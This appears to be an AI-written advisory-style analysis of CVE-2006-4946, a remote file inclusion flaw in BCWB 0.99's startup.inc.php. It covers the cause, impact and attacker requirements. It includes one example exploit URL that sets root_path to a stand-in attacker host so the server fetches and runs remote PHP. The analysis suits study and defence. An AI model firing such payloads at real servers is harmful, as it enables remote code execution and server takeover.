Based on the provided information, here's an analysis of CVE-2006-4946:

**Root Cause of Vulnerability:**
- The vulnerability stems from a **Remote File Inclusion** (RFI) weakness in the `startup.inc.php` file of BCWB version 0.99.
- The `startup.inc.php` file includes other files using a variable named `$root_path`. This variable is not properly sanitized or validated, allowing an attacker to inject a remote URL.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The primary vulnerability is the ability to include a remote file by manipulating the `$root_path` variable.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** By including a malicious remote file, an attacker can execute arbitrary code on the server.
- **Complete System Compromise:** The attacker can gain full control over the server by executing malicious PHP code.

**Attack Vectors:**
- **HTTP Request Manipulation:** The attacker can exploit this vulnerability through an HTTP request by manipulating the `root_path` parameter in the URL.
- The attacker crafts a malicious URL such as: `http://target.com/include/startup.inc.php?root_path=http://attacker.com/command.php?`.

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs to be able to send HTTP requests to the target server.
- **Malicious Server:** The attacker needs to have a server hosting a malicious PHP file that will be included in the vulnerable application.
- No authentication is required for the exploit.
